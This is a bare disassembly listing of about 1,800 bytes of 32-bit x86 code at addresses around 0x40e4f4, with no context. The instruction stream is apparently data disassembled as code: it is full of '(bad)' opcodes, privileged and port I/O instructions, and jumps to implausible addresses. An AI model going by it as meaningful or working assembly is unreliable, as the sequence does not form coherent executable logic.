  40e4f4:	cmp    ah,BYTE PTR [eax]
  40e4f6:	cld    
  40e4f7:	mov    dh,0xce
  40e4f9:	adc    dh,0x25
  40e4fc:	and    DWORD PTR [ebp+edx*8+0x63abe362],edx
  40e503:	fst    DWORD PTR [ebp-0x27]
  40e506:	fwait
  40e507:	jne    0x40e49d
  40e509:	nop
  40e50a:	mov    esp,0x2ec22e83
  40e50f:	sub    DWORD PTR [ecx+0x6e],esi
  40e512:	lods   al,BYTE PTR ds:[esi]
  40e513:	cmp    DWORD PTR [ebx-0x6d],eax
  40e516:	push   cs
  40e517:	icebp  
  40e518:	js     0x40e539
  40e51a:	stc    
  40e51b:	scas   eax,DWORD PTR es:[edi]
  40e51c:	out    dx,eax
  40e51d:	arpl   WORD PTR [edx+0x3],di
  40e520:	mov    bh,0x7a
  40e522:	sub    eax,0x32283a0
  40e527:	or     al,0x5f
  40e529:	jmp    0xe692fa1c
  40e52e:	into   
  40e52f:	and    eax,0xd98e1fc0
  40e534:	pop    esi
  40e535:	jbe    0x40e55e
  40e537:	add    BYTE PTR [ebp-0x66],dh
  40e53a:	or     eax,0x571f8ee2
  40e53f:	mov    ebp,0x63cdf532
  40e544:	(bad)  
  40e545:	cs push 0x42
  40e548:	jae    0x40e5b9
  40e54a:	adc    eax,0xaf54e24e
  40e54f:	pusha  
  40e550:	jae    0x40e590
  40e552:	clc    
  40e553:	frstor [esp+esi*2+0x1f8a385f]
  40e55a:	pop    edi
  40e55b:	mov    eax,ds:0x7fc5cd10
  40e560:	ins    BYTE PTR es:[edi],dx
  40e561:	test   BYTE PTR [ebp-0x1cb7f92],dh
  40e567:	xor    esp,edi
  40e569:	(bad)  
  40e56a:	fcomp  QWORD PTR [ebx]
  40e56c:	jb     0x40e567
  40e56e:	push   ss
  40e56f:	jbe    0x40e54f
  40e571:	ds (bad) 
  40e573:	in     eax,dx
  40e574:	rol    BYTE PTR [ebx-0x7d859af0],0xbf
  40e57b:	fs jno 0x40e58e
  40e57e:	(bad)  
  40e57f:	and    BYTE PTR [ecx],bh
  40e581:	lock in eax,dx
  40e583:	lods   al,BYTE PTR ds:[esi]
  40e584:	add    esp,DWORD PTR [eax]
  40e586:	fild   QWORD PTR [ebx-0x7a2d28b6]
  40e58c:	addr16 pop ebx
  40e58e:	aad    0x24
  40e590:	xchg   ebp,eax
  40e591:	sbb    esi,DWORD PTR [edi]
  40e593:	in     al,dx
  40e594:	mov    edx,ds
  40e596:	jae    0x40e5fb
  40e598:	pop    eax
  40e599:	and    BYTE PTR [edx+0x3f9d4de0],bh
  40e59f:	mov    ah,0xc0
  40e5a1:	js     0x40e562
  40e5a3:	inc    edx
  40e5a4:	call   0xb1acbdf2
  40e5a9:	inc    edx
  40e5aa:	push   edi
  40e5ab:	and    DWORD PTR [ecx+ecx*1],esi
  40e5ae:	xlat   BYTE PTR ds:[ebx]
  40e5af:	enter  0x4165,0x5f
  40e5b3:	jne    0x40e576
  40e5b5:	int3   
  40e5b6:	inc    ebx
  40e5b7:	and    al,0x54
  40e5b9:	fucomip st,st(1)
  40e5bb:	lahf   
  40e5bc:	and    DWORD PTR [eax],eax
  40e5be:	aam    0x1e
  40e5c0:	test   eax,0xa975d313
  40e5c5:	stc    
  40e5c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c7:	add    BYTE PTR [ebx+ebp*1],ch
  40e5ca:	sub    edx,DWORD PTR [ecx-0x4a3a1590]
  40e5d0:	out    0xc7,al
  40e5d2:	loope  0x40e55f
  40e5d4:	xlat   BYTE PTR ds:[ebx]
  40e5d5:	mov    BYTE PTR [ecx],ah
  40e5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5d8:	mov    bh,0x23
  40e5da:	cmp    BYTE PTR [ebx+0x58],0xb7
  40e5de:	xchg   ebp,eax
  40e5df:	inc    edi
  40e5e0:	fstp   DWORD PTR [eax+0x43bd7c64]
  40e5e6:	mov    al,ds:0x5e972442
  40e5eb:	inc    ebp
  40e5ec:	inc    ebp
  40e5ed:	loopne 0x40e5cf
  40e5ef:	adc    eax,0xf57e3fb0
  40e5f4:	dec    ecx
  40e5f5:	push   edi
  40e5f6:	jecxz  0x40e5df
  40e5f8:	rcr    BYTE PTR [ebp+0xb7a8dac],0xbb
  40e5ff:	dec    ebx
  40e600:	shr    edi,1
  40e602:	adc    DWORD PTR ds:0x239122d5,ebp
  40e608:	inc    edi
  40e609:	jae    0x40e63b
  40e60b:	cmc    
  40e60c:	sub    DWORD PTR [ecx-0x14508a25],0xffffffcb
  40e613:	pushf  
  40e614:	clc    
  40e615:	test   al,0xa9
  40e617:	dec    ebp
  40e618:	out    dx,eax
  40e619:	call   0xac375bf3
  40e61e:	xor    al,BYTE PTR [ebx+ecx*1-0x348ab7dc]
  40e625:	adc    ebp,ebx
  40e627:	add    ecx,DWORD PTR [bx+di]
  40e62a:	fs jb  0x40e5bd
  40e62d:	fadd   st,st(7)
  40e62f:	popa   
  40e630:	jb     0x40e5ce
  40e632:	rcr    DWORD PTR [ebx+0x32],cl
  40e635:	sbb    BYTE PTR [ecx-0x4fe05f2a],0x54
  40e63c:	iret   
  40e63d:	mov    eax,0x8609355b
  40e642:	aad    0x24
  40e644:	dec    ebp
  40e645:	je     0x40e646
  40e647:	lods   al,BYTE PTR ds:[esi]
  40e648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e649:	xor    DWORD PTR [eax],ebx
  40e64b:	xor    DWORD PTR [edi-0x6e67b040],0xfffffff0
  40e652:	stos   DWORD PTR es:[edi],eax
  40e653:	(bad)  
  40e654:	popa   
  40e655:	inc    ebp
  40e656:	fdiv   DWORD PTR [eax+0x1d8704c9]
  40e65c:	xchg   edi,eax
  40e65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e65e:	cmc    
  40e65f:	out    0x2f,eax
  40e661:	adc    eax,0x1ff86dc8
  40e666:	sbb    bl,BYTE PTR [edx+0x345d2f88]
  40e66c:	mov    al,ds:0x5977e45a
  40e671:	add    eax,0x601a240d
  40e676:	stc    
  40e677:	jg     0x40e600
  40e679:	mov    ebp,DWORD PTR [esp+edi*2]
  40e67c:	jmp    0x40e627
  40e67e:	mov    eax,0xf57fc4d8
  40e683:	fstp   TBYTE PTR [ecx]
  40e685:	xlat   BYTE PTR ds:[ebx]
  40e686:	in     al,0xaa
  40e688:	fs and al,0x18
  40e68b:	jecxz  0x40e69c
  40e68d:	loopne 0x40e6a9
  40e68f:	and    DWORD PTR [eax+0x55756666],edx
  40e695:	or     al,0xd5
  40e697:	or     al,0x65
  40e699:	jmp    0x40e704
  40e69b:	sub    dh,BYTE PTR [ecx-0x27]
  40e69e:	push   ebx
  40e69f:	test   al,0x8e
  40e6a1:	jb     0x40e6bc
  40e6a3:	les    ebx,FWORD PTR [ebp+0x685e6020]
  40e6a9:	or     eax,0x51e2b8d
  40e6ae:	mov    esi,0x3dfda5e
  40e6b3:	adc    dh,BYTE PTR [ebx-0x4b]
  40e6b6:	inc    esp
  40e6b7:	data16 fs jbe 0x40e665
  40e6bb:	push   ebp
  40e6bc:	pusha  
  40e6bd:	imul   eax,DWORD PTR [esi+esi*2+0x487f8982],0x3d413f83
  40e6c8:	outs   dx,BYTE PTR ds:[esi]
  40e6c9:	adc    eax,0x9fb79412
  40e6ce:	pop    ebx
  40e6cf:	xlat   BYTE PTR ds:[bx]
  40e6d1:	(bad)  
  40e6d2:	iret   
  40e6d3:	sub    eax,0xa36e2092
  40e6d8:	add    DWORD PTR [ecx+edi*4-0x69],eax
  40e6dc:	xchg   bh,ah
  40e6de:	dec    edx
  40e6df:	inc    ecx
  40e6e0:	jno    0x40e70a
  40e6e2:	outs   dx,DWORD PTR ds:[esi]
  40e6e3:	sbb    edi,DWORD PTR [edi+0x12]
  40e6e6:	ret    
  40e6e7:	mov    ebp,DWORD PTR ds:0xf160cc5f
  40e6ed:	fs retw 0xe9ba
  40e6f2:	jp     0x40e6b8
  40e6f4:	in     al,dx
  40e6f5:	mov    dl,ch
  40e6f7:	xchg   edi,eax
  40e6f8:	loope  0x40e75c
  40e6fa:	add    al,0x13
  40e6fc:	inc    ebx
  40e6fd:	and    esi,edx
  40e6ff:	jne    0x40e71f
  40e701:	(bad)  
  40e702:	ds inc ebp
  40e704:	outs   dx,DWORD PTR ds:[esi]
  40e705:	pop    ebp
  40e706:	add    BYTE PTR ds:0xd0d54114,bh
  40e70c:	lea    edx,[edi-0x3efac8ca]
  40e712:	xchg   ebp,eax
  40e713:	jne    0x40e730
  40e715:	pop    ebx
  40e716:	scas   al,BYTE PTR es:[edi]
  40e717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e718:	std    
  40e719:	or     bh,ch
  40e71b:	push   edx
  40e71c:	jno    0x40e712
  40e71e:	arpl   WORD PTR [ebp-0x419bb7f5],di
  40e724:	pop    ss
  40e725:	xchg   esp,eax
  40e726:	shl    DWORD PTR [ecx-0x62],cl
  40e729:	pop    ds
  40e72a:	outs   dx,BYTE PTR ds:[esi]
  40e72b:	es test eax,0xacf10798
  40e731:	outs   dx,DWORD PTR ds:[esi]
  40e732:	aad    0x56
  40e734:	fimul  DWORD PTR [edi-0xe]
  40e737:	sub    ecx,DWORD PTR [eax+eax*1+0x6c]
  40e73b:	and    eax,0xef1a205a
  40e740:	adc    DWORD PTR [ecx-0x6f9a5cb9],esp
  40e746:	aad    0xfe
  40e748:	sar    cl,1
  40e74a:	gs inc edx
  40e74c:	or     BYTE PTR [edi+0x2b1675c5],al
  40e752:	inc    ecx
  40e753:	cs jge 0x40e7ae
  40e756:	sbb    BYTE PTR [ecx+esi*2],0x16
  40e75a:	aas    
  40e75b:	inc    esi
  40e75c:	mov    edi,0x3daf108f
  40e761:	pop    esp
  40e762:	call   0x2260c86b
  40e767:	cli    
  40e768:	mov    ah,0xba
  40e76a:	adc    edi,DWORD PTR [ebp-0x7a2ac030]
  40e770:	inc    edi
  40e771:	jbe    0x40e77c
  40e773:	outs   dx,BYTE PTR ds:[esi]
  40e774:	xchg   edx,eax
  40e775:	mov    gs,WORD PTR [ecx-0x12]
  40e778:	and    eax,0xf324af20
  40e77d:	inc    ebx
  40e77e:	lahf   
  40e77f:	jg     0x40e768
  40e781:	fst    st(5)
  40e783:	xor    bl,bh
  40e785:	mov    esp,esp
  40e787:	xor    eax,DWORD PTR [esi+edx*1]
  40e78a:	bound  edx,QWORD PTR [edx+ebp*4+0x7334db24]
  40e791:	jne    0x40e760
  40e793:	adc    bl,bh
  40e795:	xor    edx,ebx
  40e797:	aaa    
  40e798:	lods   al,BYTE PTR ds:[esi]
  40e799:	int3   
  40e79a:	cs mov bh,0xf1
  40e79d:	sub    dh,ch
  40e79f:	cmp    eax,0xf0f26a2
  40e7a4:	mov    bh,0x53
  40e7a6:	jmp    DWORD PTR [edi+0x18]
  40e7a9:	iret   
  40e7aa:	mov    eax,0xc815f91f
  40e7af:	fdivr  DWORD PTR [edx-0x1f]
  40e7b2:	xchg   ebp,eax
  40e7b3:	jg     0x40e7af
  40e7b5:	lods   eax,DWORD PTR ds:[esi]
  40e7b6:	jns    0x40e814
  40e7b8:	and    ebp,eax
  40e7ba:	xchg   ebp,eax
  40e7bb:	cmp    al,0x84
  40e7bd:	inc    ebp
  40e7be:	jbe    0x40e836
  40e7c0:	mov    edi,0x316ed731
  40e7c5:	js     0x40e750
  40e7c7:	push   ebp
  40e7c8:	jge    0x40e751
  40e7ca:	fmul   st(2),st
  40e7cc:	enter  0x6d15,0xf3
  40e7d0:	mov    cl,0xc
  40e7d2:	cmp    BYTE PTR [ebx],bl
  40e7d4:	in     eax,0x1f
  40e7d6:	pop    ebx
  40e7d7:	push   es
  40e7d8:	xchg   edx,eax
  40e7d9:	pop    esp
  40e7da:	and    edi,DWORD PTR [ecx+0x42]
  40e7dd:	popa   
  40e7de:	aad    0x6e
  40e7e0:	lea    ebp,[edx+0x68]
  40e7e3:	mov    bh,BYTE PTR [ebx]
  40e7e5:	(bad)  
  40e7e6:	jbe    0x40e866
  40e7e8:	jle    0x40e7cb
  40e7ea:	loopne 0x40e830
  40e7ec:	icebp  
  40e7ed:	jo     0x40e7c1
  40e7ef:	pushf  
  40e7f0:	cmp    BYTE PTR [edi],bl
  40e7f2:	adc    edi,esi
  40e7f4:	fs aas 
  40e7f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7f7:	or     BYTE PTR [ecx-0x70],dh
  40e7fa:	pop    edi
  40e7fb:	xor    eax,ecx
  40e7fd:	call   0x74a39c0f
  40e802:	aad    0x5e
  40e804:	xchg   DWORD PTR [ebp+0x42],esi
  40e807:	xchg   ebx,eax
  40e808:	retf   0x1270
  40e80b:	hlt    
  40e80c:	cmp    esp,DWORD PTR [ebx+0x516994a6]
  40e812:	dec    ecx
  40e813:	sub    eax,0x7813294c
  40e818:	xchg   esi,eax
  40e819:	sub    ah,BYTE PTR [ecx]
  40e81b:	test   BYTE PTR [ebp+0x5ae6ad4d],dl
  40e821:	xchg   esi,eax
  40e822:	(bad)  
  40e823:	sbb    al,0x5e
  40e825:	xchg   edi,eax
  40e826:	inc    esp
  40e827:	inc    ebx
  40e828:	sub    eax,0x223dc060
  40e82d:	adc    al,0x64
  40e82f:	mov    dl,0xed
  40e831:	outs   dx,DWORD PTR ds:[esi]
  40e832:	push   ebp
  40e833:	inc    edi
  40e834:	mov    ch,0x39
  40e836:	sar    DWORD PTR [esi],cl
  40e838:	jle    0x40e8a7
  40e83a:	push   eax
  40e83b:	jge    0x40e8ae
  40e83d:	pop    esi
  40e83e:	inc    ebp
  40e83f:	cdq    
  40e840:	out    dx,eax
  40e841:	xchg   BYTE PTR [edx+0xc],ah
  40e844:	sbb    DWORD PTR [esp+ecx*2],eax
  40e847:	xor    DWORD PTR [edi+0x51b93ffb],0x3
  40e84e:	inc    edi
  40e84f:	imul   eax,DWORD PTR [ebx+0x68],0x104f17d5
  40e856:	mov    esi,0xf38703c4
  40e85b:	nop
  40e85c:	daa    
  40e85d:	rcl    DWORD PTR [ebx],cl
  40e85f:	clc    
  40e860:	popf   
  40e861:	or     eax,0x4829f336
  40e866:	inc    ebp
  40e867:	ret    0x5071
  40e86a:	xor    ch,dh
  40e86c:	xor    DWORD PTR [ecx],ecx
  40e86e:	fcomp  QWORD PTR [edi+0x54192e17]
  40e874:	mov    bl,0xe8
  40e876:	xchg   ebp,eax
  40e877:	je     0x40e8c2
  40e879:	je     0x40e849
  40e87b:	cmp    al,0x72
  40e87d:	mov    ch,0x71
  40e87f:	push   edi
  40e880:	lock ss fwait
  40e883:	push   ds
  40e884:	xchg   ecx,eax
  40e885:	cmp    al,0x16
  40e887:	jne    0x40e888
  40e889:	adc    esi,edi
  40e88b:	cmp    eax,0xa145dcbb
  40e890:	mov    ?,WORD PTR [esp+ecx*1-0x69]
  40e894:	jno    0x40e8e0
  40e896:	or     ebp,eax
  40e898:	jg     0x40e8be
  40e89a:	retf   0xe091
  40e89d:	mov    ebp,0x7da2b507
  40e8a2:	sub    eax,0x6d38b971
  40e8a7:	or     eax,0x580a617f
  40e8ac:	push   cs
  40e8ad:	mov    ds:0xa9632d6c,eax
  40e8b2:	xchg   esi,eax
  40e8b3:	mov    eax,ds:0x7bd8a549
  40e8b8:	xor    DWORD PTR [edi+0xf8d9a0f],ebx
  40e8be:	cmp    eax,0xd554bee0
  40e8c3:	imul   edi,DWORD PTR [edi-0x4b809e63],0xffffffa1
  40e8ca:	xor    al,0x83
  40e8cc:	push   ebx
  40e8cd:	or     DWORD PTR [eax+0x65],esp
  40e8d0:	push   edx
  40e8d1:	rcr    dl,0x5f
  40e8d4:	shl    bh,0x67
  40e8d7:	ja     0x40e94a
  40e8d9:	div    BYTE PTR [esi-0x44]
  40e8dc:	js     0x40e957
  40e8de:	cmp    ah,BYTE PTR [eax-0x48d9a25d]
  40e8e4:	je     0x40e965
  40e8e6:	fwait
  40e8e7:	mov    dh,0x1f
  40e8e9:	dec    ecx
  40e8ea:	pop    ebp
  40e8eb:	arpl   WORD PTR [ebx],bp
  40e8ed:	in     eax,0xd5
  40e8ef:	cld    
  40e8f0:	and    eax,0xa55d81c0
  40e8f5:	add    BYTE PTR [ebx],0x69
  40e8f8:	and    DWORD PTR cs:[ecx-0x4b5e2b14],esp
  40e8ff:	inc    esi
  40e900:	div    bh
  40e902:	mov    cs,WORD PTR [ecx]
  40e904:	add    DWORD PTR [edi-0x268c931e],0x11
  40e90b:	jns    0x40e91b
  40e90d:	mov    al,ds:0x7e990cb4
  40e912:	loope  0x40e988
  40e914:	mov    ds:0x13ae5d0f,al
  40e919:	dec    esi
  40e91a:	inc    eax
  40e91b:	mov    dh,BYTE PTR [ecx+0x4f]
  40e91e:	adc    dl,BYTE PTR [esi+0x727196c8]
  40e924:	daa    
  40e925:	nop
  40e926:	jmp    0xa2a7319f
  40e92b:	cmp    al,0xba
  40e92d:	sub    DWORD PTR ds:0xb43c718e,esp
  40e933:	scas   al,BYTE PTR es:[edi]
  40e934:	xchg   ebp,eax
  40e935:	scas   eax,DWORD PTR es:[edi]
  40e936:	xor    DWORD PTR ds:0x49cd1fce,edi
  40e93c:	adc    eax,0xf405f5ee
  40e941:	ja     0x40e918
  40e943:	aaa    
  40e944:	mov    DWORD PTR [ebx+0x6b6173ca],eax
  40e94a:	xchg   ecx,eax
  40e94b:	jl     0x40e8e6
  40e94d:	pop    es
  40e94e:	sub    bl,BYTE PTR [eax+0x6a]
  40e951:	loopne 0x40e95f
  40e953:	and    cl,dl
  40e955:	dec    esp
  40e956:	aad    0xb3
  40e958:	aam    0xb
  40e95a:	push   eax
  40e95b:	hlt    
  40e95c:	outs   dx,BYTE PTR ds:[esi]
  40e95d:	push   es
  40e95e:	in     al,dx
  40e95f:	je     0x40e9c2
  40e961:	mov    ecx,0xbca00a57
  40e966:	stc    
  40e967:	mov    ebp,0x46c7272
  40e96c:	lods   eax,DWORD PTR ds:[esi]
  40e96d:	mov    edx,0x7649b4fc
  40e972:	lahf   
  40e973:	jne    0x40e8fc
  40e975:	xchg   ebp,eax
  40e976:	hlt    
  40e977:	fdiv   DWORD PTR [ecx]
  40e979:	das    
  40e97a:	push   0x38
  40e97c:	jno    0x40e9f5
  40e97e:	fcomi  st,st(3)
  40e980:	pop    es
  40e981:	lods   al,BYTE PTR ds:[esi]
  40e982:	xchg   DWORD PTR [bx+di+0x4c],esp
  40e986:	xor    BYTE PTR [ebp+ebx*1+0x59],0xd5
  40e98b:	add    ch,BYTE PTR [ebx+0x46]
  40e98e:	sbb    eax,0xd73abc6d
  40e993:	fst    DWORD PTR [eax+0x1c076ac9]
  40e999:	add    BYTE PTR [ecx+0x21],bl
  40e99c:	mov    ebp,0xda16bc6f
  40e9a1:	and    bh,dl
  40e9a3:	fsubp  st(4),st
  40e9a5:	sbb    eax,0x8269d4a8
  40e9aa:	fnstsw WORD PTR [eax+0x71]
  40e9ad:	sub    dh,BYTE PTR [ebp+0x74]
  40e9b0:	mov    ecx,0x4e682e6d
  40e9b5:	pop    eax
  40e9b6:	test   BYTE PTR ds:0xeb129bf1,dh
  40e9bc:	inc    eax
  40e9bd:	sbb    al,0x8a
  40e9bf:	or     al,0x9
  40e9c1:	mov    al,0xd5
  40e9c3:	mov    al,0x82
  40e9c5:	mov    eax,DWORD PTR [edi+0x7a]
  40e9c8:	push   ds
  40e9c9:	xchg   ebp,eax
  40e9ca:	xchg   ebx,eax
  40e9cb:	jne    0x40e9c1
  40e9cd:	sbb    al,0x1a
  40e9cf:	sbb    DWORD PTR [ebx+0x43],ebx
  40e9d2:	retf   0x713b
  40e9d5:	jmp    0x40ea30
  40e9d7:	jnp    0x40e998
  40e9d9:	mov    ch,0x51
  40e9db:	mov    edx,0x2f2a2347
  40e9e0:	dec    esp
  40e9e1:	leave  
  40e9e2:	add    al,0xc9
  40e9e4:	sub    DWORD PTR [ebp+0x55719a5f],ebp
  40e9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9eb:	test   eax,esp
  40e9ed:	fs jmp 0x52606c81
  40e9f3:	mov    al,0x79
  40e9f5:	in     eax,dx
  40e9f6:	cdq    
  40e9f7:	shl    DWORD PTR [ecx-0x6a9a2a6c],1
  40e9fd:	sub    esp,DWORD PTR [eax+ecx*2-0x13]
  40ea01:	std    
  40ea02:	lahf   
  40ea03:	jne    0x40e9ac
  40ea05:	lods   eax,DWORD PTR ds:[esi]
  40ea06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea07:	mov    ds,WORD PTR [edx-0x52a33cdd]
  40ea0d:	or     BYTE PTR [ecx],0xf5
  40ea10:	lea    esp,[edx+0x4f]
  40ea13:	dec    edx
  40ea14:	xchg   BYTE PTR [ebx],ch
  40ea16:	mov    esi,0xe5a21375
  40ea1b:	dec    BYTE PTR [eax+0x713b7137]
  40ea21:	inc    ebp
  40ea22:	pusha  
  40ea23:	sbb    BYTE PTR [edx],0xe2
  40ea26:	adc    bl,ah
  40ea28:	cmp    ah,BYTE PTR [eax]
  40ea2a:	call   0x44892e74
  40ea2f:	fimul  DWORD PTR [eax+edi*4]
  40ea32:	aad    0x3f
  40ea34:	shrd   DWORD PTR [ebx+eiz*2+0x75b30688],ebp,0x8e
  40ea3d:	push   edx
  40ea3e:	add    DWORD PTR [ebp+0x1],ebx
  40ea41:	add    eax,0x8f7117e7
  40ea46:	cli    
  40ea47:	mov    ds:0xdf8b4131,al
  40ea4c:	add    BYTE PTR [eax],ah
  40ea4e:	mov    al,0xaa
  40ea50:	pop    ebx
  40ea51:	xchg   DWORD PTR es:[ebx],esp
  40ea54:	xor    ch,al
  40ea56:	jecxz  0x40ea73
  40ea58:	xchg   ebp,eax
  40ea59:	aaa    
  40ea5a:	cli    
  40ea5b:	xchg   esp,eax
  40ea5c:	xchg   esp,eax
  40ea5d:	xor    DWORD PTR [ebx+eiz*2-0xda8e070],eax
  40ea64:	fsub   QWORD PTR [edx+0x32]
  40ea67:	(bad)  
  40ea68:	shl    dl,cl
  40ea6a:	mov    ecx,0xf3c780f4
  40ea6f:	hlt    
  40ea70:	dec    ebx
  40ea71:	loopne 0x40ea44
  40ea73:	out    0xc5,eax
  40ea75:	in     al,dx
  40ea76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea77:	jne    0x40ea76
  40ea79:	mov    dh,0xe6
  40ea7b:	dec    ebx
  40ea7c:	mov    esp,0xac7e2daa
  40ea81:	sbb    ah,ch
  40ea83:	cmc    
  40ea84:	enter  0x47ff,0xfd
  40ea88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea89:	lahf   
  40ea8a:	xchg   ebp,eax
  40ea8b:	cmp    BYTE PTR ds:0xb6d21d29,bl
  40ea91:	je     0x40eaeb
  40ea93:	daa    
  40ea94:	or     eax,0xfd629d63
  40ea99:	rcl    ebp,1
  40ea9b:	dec    edi
  40ea9c:	inc    esp
  40ea9d:	and    al,0x47
  40ea9f:	sub    eax,0x75301e9b
  40eaa4:	cmp    eax,0x28fae193
  40eaa9:	out    dx,al
  40eaaa:	jae    0x40eb0f
  40eaac:	jno    0x40ea4d
  40eaae:	pop    ss
  40eaaf:	mov    eax,0xc2240f3b
  40eab4:	or     esp,DWORD PTR [eax]
  40eab6:	loop   0x40ea6d
  40eab8:	iret   
  40eab9:	vpshld xmm7,xmm3,[ebp-0x5fe132ed]
  40eac2:	fisub  DWORD PTR [edx]
  40eac4:	cmp    ch,BYTE PTR [ecx]
  40eac6:	xchg   BYTE PTR ds:0x7ba51fca,cl
  40eacc:	arpl   WORD PTR [edx],cx
  40eace:	punpckhbw mm0,QWORD PTR [esp+edx*2]
  40ead2:	aad    0x96
  40ead4:	stos   DWORD PTR es:[edi],eax
  40ead5:	das    
  40ead6:	shr    bh,0x69
  40ead9:	mov    bh,0x47
  40eadb:	xchg   esp,eax
  40eadc:	inc    DWORD PTR [eax+ebx*1]
  40eadf:	mov    ch,0xd8
  40eae1:	fisub  WORD PTR [edx+0x67]
  40eae4:	pusha  
  40eae5:	(bad)  
  40eae6:	fiadd  WORD PTR ds:0x75b95009
  40eaec:	ds loope 0x40ea71
  40eaef:	rcl    BYTE PTR [ecx+0x44be181f],1
  40eaf5:	dec    ecx
  40eaf6:	mov    cl,0x5b
  40eaf8:	sub    al,0x66
  40eafa:	aad    0x5
  40eafc:	dec    esi
  40eafd:	or     al,0xbe
  40eaff:	add    bh,BYTE PTR [eax+0x4c]
  40eb02:	xor    al,0x75
  40eb04:	arpl   WORD PTR [esi+esi*8-0x36460b14],di
  40eb0b:	std    
  40eb0c:	jb     0x40eb05
  40eb0e:	int    0x9a
  40eb10:	iret   
  40eb11:	mov    DWORD PTR [esi+0x35b03eb3],esp
  40eb17:	jecxz  0x40eafa
  40eb19:	pop    ds
  40eb1a:	mov    WORD PTR [ebx],ss
  40eb1c:	jmp    0x40eb9d
  40eb1e:	xchg   edx,ebp
  40eb20:	stos   DWORD PTR es:[edi],eax
  40eb21:	inc    esi
  40eb22:	icebp  
  40eb23:	call   0x921d:0xd815601b
  40eb2a:	cmp    al,0x9d
  40eb2c:	push   0x20
  40eb2e:	cmp    DWORD PTR [esi+ebx*2-0x36bc09b3],ecx
  40eb35:	mov    ecx,0x87dcbdd5
  40eb3a:	add    eax,0xe262cf94
  40eb3f:	je     0x40eb2c
  40eb41:	xchg   edx,eax
  40eb42:	mov    al,0x98
  40eb44:	pop    eax
  40eb45:	mov    fs,WORD PTR [eax]
  40eb47:	jmp    0x40ebc3
  40eb49:	push   esp
  40eb4a:	mov    eax,ds:0x6a48302
  40eb4f:	scas   eax,DWORD PTR es:[edi]
  40eb50:	icebp  
  40eb51:	pop    ss
  40eb52:	pop    eax
  40eb53:	pop    ebp
  40eb54:	and    BYTE PTR [eax],ah
  40eb56:	jns    0x40eaf6
  40eb58:	mov    esi,0x6e48dd0f
  40eb5d:	into   
  40eb5e:	repz push eax
  40eb60:	enter  0x7151,0x66
  40eb64:	xor    DWORD PTR [ebx-0x70],eax
  40eb67:	sub    edi,edx
  40eb69:	push   ds
  40eb6a:	add    BYTE PTR [ebp-0x10],dh
  40eb6d:	or     edx,DWORD PTR [edi]
  40eb6f:	nop
  40eb70:	push   ds
  40eb71:	xchg   esi,eax
  40eb72:	and    DWORD PTR [edx-0x37],esp
  40eb75:	les    edx,FWORD PTR [esi-0x1975858b]
  40eb7b:	push   ds
  40eb7c:	mov    ds:0x9972d769,al
  40eb81:	pop    ds
  40eb82:	int3   
  40eb83:	xchg   ebx,eax
  40eb84:	sahf   
  40eb85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb86:	fstp   TBYTE PTR [eax-0x5]
  40eb89:	sub    eax,0xd323bae0
  40eb8e:	nop
  40eb8f:	cld    
  40eb90:	mov    WORD PTR [esi-0x4fcad68b],fs
  40eb96:	mov    WORD PTR [ebx+0xd],ds
  40eb99:	and    BYTE PTR [eax+0x32f3b173],dh
  40eb9f:	(bad)  
  40eba0:	mov    edx,0x5ec8df18
  40eba5:	dec    ecx
  40eba6:	pop    edi
  40eba7:	jne    0x40ec05
  40eba9:	cwde   
  40ebaa:	mov    WORD PTR [ebp-0x2c],fs
  40ebad:	pop    ds
  40ebae:	cmp    ebp,edi
  40ebb0:	xor    eax,0x9e05a2e1
  40ebb5:	data16 aad 0x26
  40ebb8:	add    eax,0xaf0b837
  40ebbd:	sbb    BYTE PTR [edi-0x6deb498b],cl
  40ebc3:	dec    ebp
  40ebc4:	cmc    
  40ebc5:	sti    
  40ebc6:	push   edx
  40ebc7:	pop    edi
  40ebc8:	sub    BYTE PTR [ebx-0x1d],0xc
  40ebcc:	sub    BYTE PTR [edi],al
  40ebce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebcf:	fcom   QWORD PTR [ecx]
  40ebd1:	fisub  DWORD PTR [eax-0x36]
  40ebd4:	push   ebx
  40ebd5:	and    ah,dh
  40ebd7:	(bad)  
  40ebd8:	pop    eax
  40ebd9:	inc    ecx
  40ebda:	jne    0x40ec48
  40ebdc:	jmp    0xe8d8:0x49dad59e
  40ebe3:	push   0x20
  40ebe5:	int3   
  40ebe6:	cdq    
  40ebe7:	js     0x40ec61
  40ebe9:	(bad)  
  40ebea:	lds    edx,FWORD PTR [edi+0x109db3d0]
  40ebf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebf1:	mov    bh,0xd5
  40ebf3:	fistp  DWORD PTR [esi+0x7e]
  40ebf6:	inc    esi
  40ebf7:	xlat   BYTE PTR ds:[ebx]
  40ebf8:	jp     0x40eba3
  40ebfa:	sbb    eax,0x2fd3567a
  40ebff:	mov    ebx,0x9aa236c
  40ec04:	jmp    0xd59c:0xb46acd6f
  40ec0b:	xchg   edi,eax
  40ec0c:	adc    BYTE PTR [ebx-0x28],ch
  40ec0f:	sahf   
  40ec10:	sbb    ebx,0x20422da9
  40ec16:	fimul  DWORD PTR cs:[edi]
  40ec19:	mov    esp,0xb85fb362
  40ec1e:	fsubr  st(0),st
  40ec20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec21:	xor    dl,BYTE PTR [ecx]
  40ec23:	fst    st(1)
  40ec25:	je     0x40eca6
  40ec27:	push   ss
  40ec28:	add    edx,DWORD PTR [edi+0x6fb280b7]
  40ec2e:	loope  0x40ebd9
  40ec30:	icebp  
  40ec31:	inc    ebp
  40ec32:	aas    
  40ec33:	rcl    ah,0xa6
  40ec36:	aad    0xf0
  40ec38:	mov    ch,BYTE PTR [esi-0x64ef1f93]
  40ec3e:	push   edi
  40ec3f:	jne    0x40ec9e
  40ec41:	cs in  al,dx
  40ec43:	daa    
